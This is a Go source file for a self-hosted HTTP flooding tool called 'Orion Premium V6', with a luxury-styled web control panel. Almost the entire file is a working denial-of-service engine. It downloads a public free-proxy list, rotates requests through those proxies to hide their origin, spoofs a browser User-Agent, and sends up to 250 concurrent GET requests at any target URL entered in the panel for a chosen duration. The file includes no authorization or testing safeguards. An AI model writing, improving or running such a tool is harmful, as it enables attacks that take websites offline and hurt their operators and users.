package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ========== OPTIMIZED CONFIG ==========
const (
	proxyListURL    = "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt"
	maxActiveReqs   = 250              // Slightly lowered to ensure overhead safety
	refreshInterval = 10 * time.Minute // Auto-refresh staleness fix
	attackTimeout   = 12 * time.Second
)

type ProxyNode struct {
	URL        *url.URL
	LastFailed time.Time
}

type AttackStats struct {
	Requests uint64 `json:"requests"`
	Errors   uint64 `json:"errors"`
}

var (
	proxyPool    []*ProxyNode
	poolMu       sync.RWMutex
	stats        AttackStats
	engineActive int32 // 0 or 1
	cancelFunc   context.CancelFunc
	currentIndex uint64
)

func main() {
	// 512MB RAM Management
	debug.SetGCPercent(25) 

	// Initial Load & Refresh Goroutine
	loadProxies()
	go func() {
		ticker := time.NewTicker(refreshInterval)
		for range ticker.C {
			log.Println("[RELOADER] Refreshing proxy pool...")
			loadProxies()
		}
	}()

	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/start", handleStart)
	http.HandleFunc("/stop", handleStop)
	http.HandleFunc("/stats", handleStats)

	port := os.Getenv("PORT")
	if port == "" { port = "5000" }

	// Signal handling for clean exit
	go func() {
		stop := make(chan os.Signal, 1)
		signal.Notify(stop, os.Interrupt)
		<-stop
		log.Println("[SYSTEM] Graceful shutdown initiated.")
		os.Exit(0)
	}()

	log.Printf("[READY] Orion Premium V6 listening on %s", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

// ========== CORE ENGINE LOGIC ==========

func loadProxies() {
	resp, err := http.Get(proxyListURL)
	if err != nil { return }
	defer resp.Body.Close()

	var newNodes []*ProxyNode
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if u, err := url.Parse(line); err == nil && u.Host != "" {
			newNodes = append(newNodes, &ProxyNode{URL: u})
		} else if u, err := url.Parse("http://" + line); err == nil {
			newNodes = append(newNodes, &ProxyNode{URL: u})
		}
	}

	poolMu.Lock()
	proxyPool = newNodes
	poolMu.Unlock()
}

func getHealthyProxy() *url.URL {
	poolMu.RLock()
	defer poolMu.RUnlock()
	
	n := len(proxyPool)
	if n == 0 { return nil }

	// Try up to 5 times to find a proxy that hasn't failed in the last 60 seconds
	for i := 0; i < 5; i++ {
		idx := atomic.AddUint64(&currentIndex, 1) % uint64(n)
		node := proxyPool[idx]
		if time.Since(node.LastFailed) > 1*time.Minute {
			return node.URL
		}
	}
	// Fallback to current index if all recent are failed
	return proxyPool[currentIndex % uint64(n)].URL
}

func markProxyFailed(u *url.URL) {
	poolMu.RLock()
	defer poolMu.RUnlock()
	for _, node := range proxyPool {
		if node.URL == u {
			node.LastFailed = time.Now()
			break
		}
	}
}

func handleStart(w http.ResponseWriter, r *http.Request) {
	if atomic.LoadInt32(&engineActive) == 1 { return }

	target := r.FormValue("target")
	if _, err := url.ParseRequestURI(target); err != nil {
		http.Error(w, "Invalid Target URL", 400)
		return
	}

	duration, _ := strconv.Atoi(r.FormValue("duration"))
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	cancelFunc = cancel
	atomic.StoreInt32(&engineActive, 1)
	atomic.StoreUint64(&stats.Requests, 0)
	atomic.StoreUint64(&stats.Errors, 0)

	go func() {
		defer atomic.StoreInt32(&engineActive, 0)
		
		tr := &http.Transport{
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 30 * time.Second,
			}).DialContext,
			MaxIdleConns:        maxActiveReqs,
			IdleConnTimeout:     30 * time.Second,
			Proxy: func(req *http.Request) (*url.URL, error) {
				return getHealthyProxy(), nil
			},
		}
		client := &http.Client{Transport: tr, Timeout: attackTimeout}
		semaphore := make(chan struct{}, maxActiveReqs)
		
		for {
			select {
			case <-ctx.Done():
				return
			default:
				semaphore <- struct{}{}
				go func() {
					defer func() { <-semaphore }()
					
					req, _ := http.NewRequestWithContext(ctx, "GET", target, nil)
					req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
					
					pUsed, _ := tr.Proxy(req)
					resp, err := client.Do(req)
					if err != nil {
						atomic.AddUint64(&stats.Errors, 1)
						if pUsed != nil { markProxyFailed(pUsed) }
						return
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddUint64(&stats.Requests, 1)
				}()
			}
		}
	}()
}

func handleStop(w http.ResponseWriter, r *http.Request) {
	if cancelFunc != nil { cancelFunc() }
	w.WriteHeader(200)
}

func handleStats(w http.ResponseWriter, r *http.Request) {
	poolMu.RLock()
	pCount := len(proxyPool)
	poolMu.RUnlock()

	var m runtime.MemStats
	runtime.ReadMemStats(&m)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"requests": atomic.LoadUint64(&stats.Requests),
		"errors":   atomic.LoadUint64(&stats.Errors),
		"active":   atomic.LoadInt32(&engineActive) == 1,
		"proxies":  pCount,
		"ram":      fmt.Sprintf("%dMB", m.Alloc/1024/1024),
	})
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprint(w, luxuryHTML)
}

// ========== LUXURY HTML INTERFACE ==========

const luxuryHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>ORION V6 | PREMIERE</title>
    <style>
        :root { --accent: #d4af37; --bg: #050505; --card: #111111; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .lux-card { background: var(--card); border: 1px solid #222; padding: 40px; border-radius: 2px; width: 400px; position: relative; box-shadow: 0 40px 100px rgba(0,0,0,0.8); }
        .lux-card::after { content: ''; position: absolute; top: -1px; left: -1px; right: -1px; bottom: -1px; border: 1px solid var(--accent); opacity: 0.1; pointer-events: none; }
        h1 { color: var(--accent); font-weight: 200; text-align: center; letter-spacing: 12px; font-size: 1.2rem; margin-bottom: 40px; }
        .data-row { display: flex; justify-content: space-between; margin-bottom: 20px; border-bottom: 1px solid #1a1a1a; padding-bottom: 10px; }
        .label { font-size: 0.65rem; text-transform: uppercase; color: #555; letter-spacing: 2px; }
        .value { font-family: 'Courier New', monospace; font-size: 1.1rem; color: #eee; }
        input { width: 100%; background: #000; border: 1px solid #222; padding: 12px; color: var(--accent); margin-bottom: 10px; box-sizing: border-box; outline: none; }
        .ctrl-btn { width: 100%; padding: 15px; border: 1px solid var(--accent); background: transparent; color: var(--accent); cursor: pointer; transition: 0.4s; letter-spacing: 3px; font-size: 0.7rem; }
        .ctrl-btn:hover { background: var(--accent); color: #000; }
        #stopBtn { margin-top: 10px; border-color: #444; color: #444; }
        #stopBtn:hover { border-color: #ff4444; color: #ff4444; background: transparent; }
        .status-led { width: 6px; height: 6px; border-radius: 50%; display: inline-block; margin-right: 10px; background: #333; }
        .active-led { background: #00ff88; box-shadow: 0 0 10px #00ff88; }
    </style>
</head>
<body>
    <div class="lux-card">
        <h1>ORION VI</h1>
        <div class="data-row">
            <span class="label"><div id="led" class="status-led"></div>Engine Status</span>
            <span class="value" id="status">IDLE</span>
        </div>
        <div class="data-row">
            <span class="label">Total Requests</span>
            <span class="value" id="reqs">0</span>
        </div>
        <div class="data-row">
            <span class="label">Allocated RAM</span>
            <span class="value" id="ram">0MB</span>
        </div>
        <div class="data-row">
            <span class="label">Live Pool</span>
            <span class="value" id="proxies">0</span>
        </div>
        
        <input type="text" id="target" value="https://google.com">
        <input type="number" id="duration" value="300">
        
        <button id="startBtn" class="ctrl-btn">INITIATE SEQUENCE</button>
        <button id="stopBtn" class="ctrl-btn">TERMINATE</button>
    </div>

    <script>
        const update = async () => {
            try {
                const res = await fetch('/stats');
                const data = await res.json();
                document.getElementById('reqs').innerText = data.requests.toLocaleString();
                document.getElementById('ram').innerText = data.ram;
                document.getElementById('proxies').innerText = data.proxies;
                document.getElementById('status').innerText = data.active ? 'ENGAGED' : 'IDLE';
                document.getElementById('led').className = data.active ? 'status-led active-led' : 'status-led';
            } catch(e) {}
        };
        document.getElementById('startBtn').onclick = async () => {
            const p = new URLSearchParams({target: document.getElementById('target').value, duration: document.getElementById('duration').value});
            await fetch('/start?' + p.toString());
        };
        document.getElementById('stopBtn').onclick = () => fetch('/stop');
        setInterval(update, 1000);
    </script>
</body>
</html>
`
